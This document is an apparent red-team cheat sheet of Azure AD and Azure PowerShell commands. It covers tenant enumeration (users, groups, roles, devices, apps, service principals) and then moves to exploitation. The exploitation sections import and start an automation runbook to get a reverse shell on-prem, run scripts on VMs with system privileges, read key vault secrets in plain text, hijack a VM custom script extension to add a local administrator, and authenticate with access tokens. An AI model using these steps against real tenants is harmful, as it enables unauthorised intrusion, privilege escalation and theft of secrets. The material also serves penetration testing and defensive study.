### Install the AzureADPreview module

>Install-Module AzureAD

>Import-Module AzureAD

### Connect 

> $passwd = ConvertTo-SecureString
"\<password>" -AsPlainText -Force

>$creds = New-Object System.Management.Automation.PSCredential
("\<username>@\<domain name>.onmicrosoft.com"
, $passwd)

>Connect-AzureAD -Credential $creds

Get the current session state (like whoami)
> Get-AzureADCurrentSessionInfo

Get details of the current tenant
> Get-AzureADTenantDetail

## Users

Enumerate all users
> Get-AzureADUser -All $true 

To obtain only the email addresses:
>$users = Get-AzureADUser -All $true

>foreach ($user in $users) {
    $email = $user.UserPrincipalName
    Write-Output $email | Tee-Object -FilePath "emails.txt" -Append
}

Enumerate a specific user
> Get-AzureADUser -ObjectId \<username>@\<domain name>.onmicrosoft.com

Search for a user that has "admin" in the display name of user principal name 
> Get-AzureADUser -SearchString "admin"

> Get-AzureADUser -All \$true |?{$_.Displayname -match "admin"} 

List all the attributes of a user
> Get-AzureADUser -ObjectId \<username>@\<domain name>.onmicrosoft.com | fl *

> Get-AzureADUser -ObjectId \<username>@\<domain name>.onmicrosoft.com | %{$_.PSObject.Properties.Name} 

Search for attributes of users that contain the string "password"
> Get-AzureADUser -All \$true |%{\$Properties =
$_;$Properties.PSObject.Properties.Name | % {if
(\$Properties.\$_ -match 'password')
{"$($Properties.UserPrincipalName) - $_ -
\$($Properties.$_)"}}}

All users who are synced from on-prem
> Get-AzureADUser -All \$true |
?{$_.OnPremisesSecurityIdentifier -ne $null}

All users who are from Azure AD
> Get-AzureADUser -All \$true |
?{$_.OnPremisesSecurityIdentifier -eq $null}

Objects created by any user
> Get-AzureADUser | Get-AzureADUserCreatedObject

Objects created by a specific user
> Get-AzureADUserOwnedObject -ObjectId
\<username>@\<domain name>.onmicrosoft.com

## Groups

List all groups
> Get-AzureADGroup -All $true 

Enumerate a specific group
> Get-AzureADGroup -ObjectId \<objectID>

Search for a group based on string in first characters of DisplayName 
> Get-AzureADGroup -SearchString "admin" | fl *

Search for groups which contain the word "admin" in their name
> Get-AzureADGroup -All \$true |?{$_.Displayname -match "admin"} 

Get Groups that allow Dynamic membership
> Get-AzureADMSGroup | ?{$_.GroupTypes -eq
'DynamicMembership'}

Get those dynamic rules
>Get-AzureADMSGroup | ?{$_.GroupTypes -eq 'DynamicMembership'} | select MembershipRule

All groups synced from on-prem
> Get-AzureADGroup -All \$true |
?{$_.OnPremisesSecurityIdentifier -ne $null} 

All groups from Azure AD
> Get-AzureADGroup -All \$true |
?{$_.OnPremisesSecurityIdentifier -eq $null}

Get members of a group
> Get-AzureADGroupMember -ObjectId \<objectID>

Get groups and roles where the specified user is a member
> Get-AzureADUser -SearchString '\<username>' | GetAzureADUserMembership

> Get-AzureADUserMembership -ObjectId
\<username>@\<domain name>.onmicrosoft.com

Get all available roles templates
> Get-AzureADDirectoryroleTemplate

Get all enabled roles 
> Get-AzureADDirectoryRole

Enumerate users to whom GA role is assigned
> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global
Administrator'" | Get-AzureADDirectoryRoleMember

## Devices

Get all Azure joined and registered devices
> Get-AzureADDevice -All $true | fl *

Get the device configuration object
> Get-AzureADDeviceConfiguration | fl *

List all the active devices
> Get-AzureADDevice -All \$true |
?{$_.ApproximateLastLogonTimeStamp -ne $null}

List Registered owners of all the devices
> Get-AzureADDevice -All $true | Get-AzureADDeviceRegisteredOwner

> Get-AzureADDevice -All $true | %{if($user=Get-AzureADDeviceRegisteredOwner -ObjectId
\$\_.ObjectID){\$_;$user.UserPrincipalName;"`n"}} 

List devices owned by a user
> Get-AzureADUserOwnedDevice -ObjectId \<username>@\<domain name>.onmicrosoft.com

List devices registered by a user
> Get-AzureADUserRegisteredDevice -ObjectId \<username>@\<domain name>.onmicrosoft.com

List devices managed using Intune
> Get-AzureADDevice -All \$true | ?{$_.IsCompliant -eq "True"}

## Aplications

Get all the application objects registered with the current tenant 
> Get-AzureADApplication -All $true

Get all details about an app
> Get-AzureADApplication -ObjectId \<objectID> | fl *

Get an app based on the display name
> Get-AzureADApplication -All \$true | ?{$_.DisplayName -match "app"} 

Show apps with a password (cannot see the password)
> Get-AzureADApplication -All \$true | %{if(Get-AzureADApplicationPasswordCredential -ObjectID \$\_.ObjectID){$_}}

Get owner of an application 
> Get-AzureADApplication -ObjectId \<objectID> | Get-AzureADApplicationOwner |fl * 

Get Apps where a User has a role (exact role is not shown)
> Get-AzureADUser -ObjectId
\<username>@\<domain name>.onmicrosoft.com | Get-AzureADUserAppRoleAssignment | fl *

Get Apps where a Group has a role (exact role is not shown)
> Get-AzureADGroup -ObjectId \<objectID> | Get-AzureADGroupAppRoleAssignment | fl *

## Service principals

Get all service principals (Enterprise Apps in Portal)
> Get-AzureADServicePrincipal -All $true

Get all details about a service principal
> Get-AzureADServicePrincipal -ObjectId \<objectID> | fl *

Get a service principal based on the display name
> Get-AzureADServicePrincipal -All \$true | ?{$_.DisplayName -match "app"} 

List all the service principals with an application password
> Get-AzureADServicePrincipal -All $true | %{if(Get-AzureADServicePrincipalKeyCredential -ObjectID \$\_.ObjectID){\$_}}

Get owner of a service principal
> Get-AzureADServicePrincipal -ObjectId \<objectID> | Get-AzureADServicePrincipalOwner |fl * 

Get objects owned by a service principal
> Get-AzureADServicePrincipal -ObjectId \<objectID> | Get-AzureADServicePrincipalOwnedObject

Get objects created by a service principal
> Get-AzureADServicePrincipal -ObjectId \<objectID> | Get-AzureADServicePrincipalCreatedObject

Get group and role memberships of a service principal
> Get-AzureADServicePrincipal -ObjectId \<objectID> | Get-AzureADServicePrincipalMembership |fl *

## Application proxies
Get all apps that have application proxies configured
>Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId \$\_.ObjectID;\$\_.DisplayName;$_.ObjectID}catch{}}

Get the service principal (enterprise app) - they have the same name
>Get-AzureADServicePrincipal -All \$true | ?{$_.DisplayName -eq "\<name>"}

### Access tokens
Connect tusing tokens for AAD Graph
> Connect-AzureAD -AccountId
\<username>@\<domain name>.onmicrosoft.com -AadAccessToken $token

### Add a user to a group
Add-AzureADGroupMember -ObjectId \<group objectID> -RefObjectId \<user objectID> -Verbose

### Exploit Automation Accounts

See if a hybrid worker group is in use by the automation account. This will allow us to execute commands on-prem
> Get-AzAutomationHybridWorkerGroup -AutomationAccountName \<automation account name> -ResourceGroupName \<resource group name>

Run command to get reverse shell through the worker. 
>Import-AzAutomationRunbook -Name \<runbook name> -Path
\<path> -AutomationAccountName \<automation account name> -ResourceGroupName \<resource group name> -Type PowerShell -Force -Verbose

Publish the runbook
>Publish-AzAutomationRunbook -RunbookName \<runbook name> -AutomationAccountName \<automation account name> -ResourceGroupName \<resource group name> -Verbose

Start the runbook (with a listener on)
>Start-AzAutomationRunbook -RunbookName \<runbook name> -RunOn \<worker group name> -AutomationAccountName \<automation account name> -ResourceGroupName \<resource group name> -Verbose

### Run command on VM (if you have the runCommand action) (add your own user to the VM - you can run commands with system privileges)
> Invoke-AzVMRunCommand -VMName \<VM name> -ResourceGroupName \<resource group name> -CommandId 'RunPowerShellScript' -ScriptPath \<script paht> -Verbose

### Connect to a VM knowing the  IP and credentials
To get the IP:
> Get-AzPublicIpAddress -Name \<VM name>

> $password = ConvertTo-SecureString '\<password>' -AsPlainText -Force

>$creds = New-Object
System.Management.Automation.PSCredential('\<username>', $Password)

> $session = New-PSSession -ComputerName \<IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)

>Enter-PSSession $session

### Get a secret from a key vault

>Get-AzKeyVault

>Get-AzKeyVaultSecret -VaultName \<vault name>

>Get-AzKeyVaultSecret -VaultName \<vault name> -Name \<secret name> â€“AsPlainText

### Get information about a control unit
>Get-AzureADMSAdministrativeUnit -Id \<objectID>

>Get-AzureADMSAdministrativeUnitMember -Id \<objectID>

Check for roles scoped to the administrative unit
>Get-AzureADMSScopedRoleMembership -Id \<objectID> | fl *

### Edit an existing VM custom extension
See if the found extension is already installed
>Get-AzVMExtension -ResourceGroupName \<resource group name> -VMName "\<VM name>"

Modify the "commandToExecute" to add a new local admin
```
Set-AzVMExtension -ResourceGroupName "<resource group name>" -ExtensionName "<extension name>" -VMName "<VM name>" -Location "<location>" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users <username> <password> /add /Y; net localgroup administrators <username> /add"}'
```

### Enumerate a storage container
>Get-AzStorageContainer -Context (Get-AzStorageAccount -Name \<storage account name> -ResourceGroupName \<resource group name>).Context
